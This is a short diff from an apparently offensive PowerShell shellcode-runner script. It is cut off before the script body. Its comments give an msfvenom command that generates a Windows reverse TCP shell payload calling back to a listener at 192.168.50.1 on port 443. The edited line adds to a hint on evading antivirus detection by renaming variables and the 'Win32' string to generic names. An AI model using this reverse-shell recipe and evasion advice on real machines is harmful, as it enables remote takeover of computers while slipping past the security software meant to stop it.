@@ -1,5 +1,5 @@
 # Generate Payload for $sc variable with: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
-# Hint: If script is still blocked by antivirus software, we can try to change variable names $winFunc and/or $sc to something more generic like $var1 and $var2
+# Hint: If script is still blocked by antivirus software, we can try to change variable names $winFunc, $sc and "Win32" to something more generic like $var1, $var2 and iWin32
 
 
 $code = '
